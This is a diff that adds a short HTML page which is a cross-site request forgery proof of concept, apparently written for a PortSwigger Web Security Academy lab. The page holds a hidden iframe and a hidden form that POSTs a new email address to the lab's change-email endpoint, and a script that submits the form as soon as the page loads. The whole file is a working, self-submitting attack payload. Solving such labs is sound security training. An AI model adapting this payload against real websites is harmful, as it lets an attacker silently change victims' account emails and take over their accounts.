@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0af8000f03f065b5c0d26402008600fb.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="ItachiUchiha82@konoha.org">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
